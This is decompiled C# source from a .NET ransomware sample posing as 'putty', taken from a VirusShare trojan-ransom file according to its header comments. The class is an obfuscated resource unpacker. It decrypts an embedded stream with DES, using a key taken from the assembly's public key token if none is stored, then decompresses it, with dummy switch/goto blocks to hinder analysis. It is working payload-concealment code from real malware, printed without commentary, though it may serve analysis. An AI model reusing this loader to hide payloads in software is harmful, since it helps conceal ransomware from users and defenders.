// Decompiled with JetBrains decompiler
// Type: A.c6c9bcba1d364a1b6514bb4cf7f0fe665
// Assembly: putty, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0D41ADEA-EF2A-401A-8401-9BDACD98C31B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-2d99c2702cd3ed7bc2fd9376b05f88abd686650bac92f1411db7cdb32f25c607.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace A
{
  internal sealed class c6c9bcba1d364a1b6514bb4cf7f0fe665
  {
    private static readonly object c6930b81cbb00c6d3d4ef28790422d586;
    private static readonly int cbfa6cdb8d24c9f183c67f425ab4e68f2;
    private static readonly int ce9a04cc1c6fc3db1cc16f2b0efa41ce0;
    private static readonly MemoryStream cd5df3e004af0b261eb1f6f581a305d03 = (MemoryStream) null;
    private static readonly MemoryStream c8a3629f87daaf13c9c57c4a112f7457d = (MemoryStream) null;

    static c6c9bcba1d364a1b6514bb4cf7f0fe665()
    {
      c6c9bcba1d364a1b6514bb4cf7f0fe665.cbfa6cdb8d24c9f183c67f425ab4e68f2 = int.MaxValue;
      c6c9bcba1d364a1b6514bb4cf7f0fe665.ce9a04cc1c6fc3db1cc16f2b0efa41ce0 = int.MinValue;
      c6c9bcba1d364a1b6514bb4cf7f0fe665.cd5df3e004af0b261eb1f6f581a305d03 = new MemoryStream(0);
      c6c9bcba1d364a1b6514bb4cf7f0fe665.c8a3629f87daaf13c9c57c4a112f7457d = new MemoryStream(0);
      c6c9bcba1d364a1b6514bb4cf7f0fe665.c6930b81cbb00c6d3d4ef28790422d586 = new object();
    }

    private static string c952b580ded090fa89d7cd7278456842b(
      Assembly c26a7ff3003cdedc6f0369020412ba365)
    {
      string str = c26a7ff3003cdedc6f0369020412ba365.FullName;
      int length = str.IndexOf(',');
      if (length >= 0)
        str = str.Substring(0, length);
      return str;
    }

    private static byte[] c523bddbb716b039273acacbbb1d27868(
      Assembly c26a7ff3003cdedc6f0369020412ba365)
    {
      try
      {
        string fullName = c26a7ff3003cdedc6f0369020412ba365.FullName;
        int num1 = fullName.IndexOf("PublicKeyToken=");
        if (num1 < 0)
          num1 = fullName.IndexOf("publickeytoken=");
        if (num1 < 0)
        {
label_3:
          switch (1)
          {
            case 0:
              goto label_3;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (c6c9bcba1d364a1b6514bb4cf7f0fe665.c523bddbb716b039273acacbbb1d27868);
              }
              return (byte[]) null;
          }
        }
        else
        {
          int num2 = num1 + 15;
          if (fullName[num2] != 'n')
          {
label_8:
            switch (6)
            {
              case 0:
                goto label_8;
              default:
                if (fullName[num2] == 'N')
                {
label_10:
                  switch (1)
                  {
                    case 0:
                      goto label_10;
                  }
                }
                else
                {
                  byte[] bytes = BitConverter.GetBytes(long.Parse(fullName.Substring(num2, 16), NumberStyles.HexNumber));
                  Array.Reverse((Array) bytes);
                  return bytes;
                }
                break;
            }
          }
          return (byte[]) null;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] cabd2c83fc30ff0335d68072a5c434368(
      short cb21a96ece76db27fd5231034f0614496,
      Stream c3b0f053d03a96c6b56f11e3f142b5bf9)
    {
      lock (c6c9bcba1d364a1b6514bb4cf7f0fe665.c6930b81cbb00c6d3d4ef28790422d586)
      {
        Stream stream = c3b0f053d03a96c6b56f11e3f142b5bf9;
        MemoryStream memoryStream = (MemoryStream) null;
        ushort num1 = ~(ushort) c3b0f053d03a96c6b56f11e3f142b5bf9.ReadByte();
        for (int index = 1; index < 2; ++index)
          c3b0f053d03a96c6b56f11e3f142b5bf9.ReadByte();
label_4:
        switch (5)
        {
          case 0:
            goto label_4;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (c6c9bcba1d364a1b6514bb4cf7f0fe665.cabd2c83fc30ff0335d68072a5c434368);
            }
            if (((int) num1 & 2) != 0)
            {
label_8:
              switch (6)
              {
                case 0:
                  goto label_8;
                default:
                  DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
                  byte[] buffer1 = new byte[8];
                  c3b0f053d03a96c6b56f11e3f142b5bf9.Read(buffer1, 0, 8);
                  cryptoServiceProvider.IV = buffer1;
                  byte[] buffer2 = new byte[8];
                  c3b0f053d03a96c6b56f11e3f142b5bf9.Read(buffer2, 0, 8);
                  bool flag = true;
                  foreach (byte num2 in buffer2)
                  {
                    if (num2 != (byte) 0)
                    {
                      flag = false;
                      break;
                    }
                  }
                  if (flag)
                    buffer2 = c6c9bcba1d364a1b6514bb4cf7f0fe665.c523bddbb716b039273acacbbb1d27868(Assembly.GetExecutingAssembly());
                  cryptoServiceProvider.Key = buffer2;
                  if (c6c9bcba1d364a1b6514bb4cf7f0fe665.cd5df3e004af0b261eb1f6f581a305d03 == null)
                    c6c9bcba1d364a1b6514bb4cf7f0fe665.cd5df3e004af0b261eb1f6f581a305d03.Capacity = c6c9bcba1d364a1b6514bb4cf7f0fe665.cbfa6cdb8d24c9f183c67f425ab4e68f2 != int.MaxValue ? c6c9bcba1d364a1b6514bb4cf7f0fe665.cbfa6cdb8d24c9f183c67f425ab4e68f2 : (int) c3b0f053d03a96c6b56f11e3f142b5bf9.Length;
                  c6c9bcba1d364a1b6514bb4cf7f0fe665.cd5df3e004af0b261eb1f6f581a305d03.Position = 0L;
                  ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor();
                  int inputBlockSize = decryptor.InputBlockSize;
                  int outputBlockSize = decryptor.OutputBlockSize;
                  byte[] numArray1 = new byte[decryptor.OutputBlockSize];
                  byte[] numArray2 = new byte[decryptor.InputBlockSize];
                  int position;
                  for (position = (int) c3b0f053d03a96c6b56f11e3f142b5bf9.Position; (long) (position + inputBlockSize) < c3b0f053d03a96c6b56f11e3f142b5bf9.Length; position += inputBlockSize)
                  {
                    c3b0f053d03a96c6b56f11e3f142b5bf9.Read(numArray2, 0, inputBlockSize);
                    int count = decryptor.TransformBlock(numArray2, 0, inputBlockSize, numArray1, 0);
                    c6c9bcba1d364a1b6514bb4cf7f0fe665.cd5df3e004af0b261eb1f6f581a305d03.Write(numArray1, 0, count);
                  }
label_21:
                  switch (1)
                  {
                    case 0:
                      goto label_21;
                    default:
                      c3b0f053d03a96c6b56f11e3f142b5bf9.Read(numArray2, 0, (int) (c3b0f053d03a96c6b56f11e3f142b5bf9.Length - (long) position));
                      byte[] buffer3 = decryptor.TransformFinalBlock(numArray2, 0, (int) (c3b0f053d03a96c6b56f11e3f142b5bf9.Length - (long) position));
                      c6c9bcba1d364a1b6514bb4cf7f0fe665.cd5df3e004af0b261eb1f6f581a305d03.Write(buffer3, 0, buffer3.Length);
                      stream = (Stream) c6c9bcba1d364a1b6514bb4cf7f0fe665.cd5df3e004af0b261eb1f6f581a305d03;
                      stream.Position = 0L;
                      memoryStream = c6c9bcba1d364a1b6514bb4cf7f0fe665.cd5df3e004af0b261eb1f6f581a305d03;
                      break;
                  }
                  break;
              }
            }
            if (((int) num1 & 8) != 0)
            {
label_24:
              switch (6)
              {
                case 0:
                  goto label_24;
                default:
                  try
                  {
                    if (c6c9bcba1d364a1b6514bb4cf7f0fe665.c8a3629f87daaf13c9c57c4a112f7457d == null)
                    {
label_26:
                      switch (5)
                      {
                        case 0:
                          goto label_26;
                        default:
                          if (c6c9bcba1d364a1b6514bb4cf7f0fe665.ce9a04cc1c6fc3db1cc16f2b0efa41ce0 == int.MinValue)
                          {
label_28:
                            switch (7)
                            {
                              case 0:
                                goto label_28;
                              default:
                                c6c9bcba1d364a1b6514bb4cf7f0fe665.c8a3629f87daaf13c9c57c4a112f7457d.Capacity = (int) stream.Length * 2;
                                break;
                            }
                          }
                          else
                          {
                            c6c9bcba1d364a1b6514bb4cf7f0fe665.c8a3629f87daaf13c9c57c4a112f7457d.Capacity = c6c9bcba1d364a1b6514bb4cf7f0fe665.ce9a04cc1c6fc3db1cc16f2b0efa41ce0;
                            break;
                          }
                          break;
                      }
                    }
                    c6c9bcba1d364a1b6514bb4cf7f0fe665.c8a3629f87daaf13c9c57c4a112f7457d.Position = 0L;
                    DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress);
                    int count1 = 1000;
                    byte[] buffer = new byte[count1];
                    int count2;
                    do
                    {
                      count2 = deflateStream.Read(buffer, 0, count1);
                      if (count2 > 0)
                        c6c9bcba1d364a1b6514bb4cf7f0fe665.c8a3629f87daaf13c9c57c4a112f7457d.Write(buffer, 0, count2);
                    }
                    while (count2 >= count1);
                    memoryStream = c6c9bcba1d364a1b6514bb4cf7f0fe665.c8a3629f87daaf13c9c57c4a112f7457d;
                    break;
                  }
                  catch (Exception ex)
                  {
                    break;
                  }
              }
            }
            if (memoryStream != null)
              return memoryStream.ToArray();
            byte[] buffer4 = new byte[c3b0f053d03a96c6b56f11e3f142b5bf9.Length - c3b0f053d03a96c6b56f11e3f142b5bf9.Position];
            c3b0f053d03a96c6b56f11e3f142b5bf9.Read(buffer4, 0, buffer4.Length);
            return buffer4;
        }
      }
    }
  }
}
